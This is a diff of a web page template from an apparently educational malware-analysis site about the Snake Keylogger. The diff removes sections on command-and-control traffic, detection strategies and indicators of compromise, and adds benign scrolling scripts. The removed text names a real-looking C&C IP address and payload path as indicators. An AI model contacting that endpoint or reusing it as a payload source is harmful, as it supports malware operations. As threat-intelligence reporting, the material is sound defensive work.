-<pre class="text-green-400 text-xs"><code>// Command & Control Server
-C&C: 192.3.220.6/web/w88.js
-Method: HTTP GET requests
-Payload: Base64 encoded commands
-Persistence: Registry modifications</code></pre>
-                </div>
-                <div class="bg-gray-800/50 rounded-lg p-6">
-                    <h5 class="text-blue-400 font-semibold mb-3">Traffic Analysis</h5>
-                    <ul class="text-gray-300 text-sm space-y-2">
-                        <li>• <strong>Domain:</strong> 192.3.220.6</li>
-                        <li>• <strong>Path:</strong> /web/w88.js</li>
-                        <li>• <strong>Protocol:</strong> HTTP (unencrypted)</li>
-                        <li>• <strong>Frequency:</strong> Periodic check-ins</li>
-                    </ul>
-                </div>
-            </div>
-            
-            <div>
-                <h4 class="text-green-400 font-semibold mb-4">Communication Flow</h4>
-                <div class="bg-gray-900/50 rounded-lg p-4 mb-4">
-                    <img src="{{ asset('images/snake_keylogger/s4.png') }}" alt="Network Communication" class="w-full rounded-lg">
-                </div>
-                <div class="bg-gray-800/50 rounded-lg p-6">
-                    <h5 class="text-blue-400 font-semibold mb-3">Research Methodology</h5>
-                    <ul class="text-gray-300 text-sm space-y-2">
-                        <li>• <strong>Safe Analysis:</strong> Conducted in isolated environment</li>
-                        <li>• <strong>Manual Deobfuscation:</strong> Character code mathematics</li>
-                        <li>• <strong>Network Monitoring:</strong> Traffic analysis without execution</li>
-                        <li>• <strong>Sample Source:</strong> Malware Bazaar repository</li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Detection and Prevention -->
-    <div class="malware-card rounded-2xl p-8 mb-16">
-        <h3 class="text-2xl font-bold text-white mb-6 text-center">Detection & Prevention Strategies</h3>
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-            <div class="ioc-indicator rounded-lg p-6">
-                <div class="flex items-center mb-4">
-                    <i class="fas fa-search text-blue-400 text-xl mr-3"></i>
-                    <h4 class="text-blue-400 font-semibold">Static Analysis</h4>
-                </div>
-                <ul class="text-gray-300 text-sm space-y-1">
-                    <li>• String pattern matching</li>
-                    <li>• Obfuscation detection</li>
-                    <li>• ActiveX object identification</li>
-                    <li>• Entropy analysis</li>
-                </ul>
-            </div>
-            
-            <div class="ioc-indicator rounded-lg p-6">
-                <div class="flex items-center mb-4">
-                    <i class="fas fa-eye text-green-400 text-xl mr-3"></i>
-                    <h4 class="text-green-400 font-semibold">Behavioral Analysis</h4>
-                </div>
-                <ul class="text-gray-300 text-sm space-y-1">
-                    <li>• Network communication monitoring</li>
-                    <li>• Registry modification detection</li>
-                    <li>• Process injection analysis</li>
-                    <li>• Keylogger behavior patterns</li>
-                </ul>
-            </div>
-            
-            <div class="ioc-indicator rounded-lg p-6">
-                <div class="flex items-center mb-4">
-                    <i class="fas fa-shield-alt text-purple-400 text-xl mr-3"></i>
-                    <h4 class="text-purple-400 font-semibold">Prevention</h4>
-                </div>
-                <ul class="text-gray-300 text-sm space-y-1">
-                    <li>• ActiveX restrictions</li>
-                    <li>• Script execution policies</li>
-                    <li>• Network segmentation</li>
-                    <li>• User awareness training</li>
-                </ul>
-            </div>
-        </div>
-    </div>
-
-    <!-- IOCs Section -->
-    <div class="malware-card rounded-2xl p-8">
-        <h3 class="text-2xl font-bold text-white mb-6 text-center">Indicators of Compromise (IOCs)</h3>
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-            <div class="bg-gray-800/50 rounded-lg p-6">
-                <div class="flex items-center mb-4">
-                    <i class="fas fa-globe text-red-400 text-xl mr-3"></i>
-                    <h4 class="text-red-400 font-semibold">Network Indicators</h4>
-                </div>
-                <ul class="text-gray-300 text-sm space-y-2">
-                    <li>• <strong>IP:</strong> 192.3.220.6</li>
-                    <li>• <strong>URL:</strong> /web/w88.js</li>
-                    <li>• <strong>Protocol:</strong> HTTP</li>
-                    <li>• <strong>User-Agent:</strong> Mozilla/5.0 variations</li>
-                </ul>
-            </div>
-            
-            <div class="bg-gray-800/50 rounded-lg p-6">
-                <div class="flex items-center mb-4">
-                    <i class="fas fa-file-code text-orange-400 text-xl mr-3"></i>
-                    <h4 class="text-orange-400 font-semibold">File Indicators</h4>
-                </div>
-                <ul class="text-gray-300 text-sm space-y-2">
-                    <li>• Obfuscated JavaScript files</li>
-                    <li>• Base64 encoded payloads</li>
-                    <li>• Temporary file creation</li>
-                    <li>• Registry persistence entries</li>
-                </ul>
-            </div>
-            
-            <div class="bg-gray-800/50 rounded-lg p-6">
-                <div class="flex items-center mb-4">
-                    <i class="fas fa-cogs text-yellow-400 text-xl mr-3"></i>
-                    <h4 class="text-yellow-400 font-semibold">Behavioral Indicators</h4>
-                </div>
-                <ul class="text-gray-300 text-sm space-y-2">
-                    <li>• ActiveX object instantiation</li>
-                    <li>• Keystroke capture attempts</li>
-                    <li>• Periodic network beaconing</li>
-                    <li>• Process injection activities</li>
-                </ul>
-            </div>
-        </div>
-    </div>
+    <!-- Back to Top -->
+    <button onclick="window.scrollTo({top: 0, behavior: 'smooth'})" 
+            class="fixed bottom-6 right-6 bg-red-600 hover:bg-red-700 text-white p-3 rounded-full shadow-lg transition-colors">
+        <i class="fas fa-arrow-up"></i>
+    </button>
 </div>
-@endsection
 
-@push('scripts')
 <script>
-document.addEventListener('DOMContentLoaded', function() {
-    // Add keyboard shortcuts
-    document.addEventListener('keydown', function(event) {
-        if (event.ctrlKey || event.metaKey) {
-            switch(event.key) {
-                case '1':
-                    event.preventDefault();
-                    window.location.href = "{{ route('nexus.encryption') }}";
-                    break;
-                case '2':
-                    event.preventDefault();
-                    window.location.href = "{{ route('nexus.rat-analysis') }}";
-                    break;
-                case '3':
-                    event.preventDefault();
-                    // Already on snake-keylogger page
-                    break;
-                case '4':
-                    event.preventDefault();
-                    window.location.href = "{{ route('nexus.first-semester') }}#nexus-flowchart";
-                    break;
-                case 'h':
-                    event.preventDefault();
-                    window.location.href = "{{ route('nexus.first-semester') }}";
-                    break;
-            }
+// Smooth scrolling for navigation links
+document.querySelectorAll('nav a[href^="#"]').forEach(anchor => {
+    anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+            target.scrollIntoView({
+                behavior: 'smooth',
+                block: 'start'
+            });
+        }
+    });
+});
+
+// Highlight current section in navigation
+window.addEventListener('scroll', () => {
+    const sections = document.querySelectorAll('section[id]');
+    const navLinks = document.querySelectorAll('nav a[href^="#"]');
+    
+    let current = '';
+    sections.forEach(section => {
+        const sectionTop = section.offsetTop;
+        const sectionHeight = section.clientHeight;
+        if (window.pageYOffset >= sectionTop - 200) {
+            current = section.getAttribute('id');
+        }
+    });
+
+    navLinks.forEach(link => {
+        link.classList.remove('text-red-400');
+        if (link.getAttribute('href') === `#${current}`) {
+            link.classList.add('text-red-400');
         }
     });
 });
 </script>
-@endpush
+@endsection
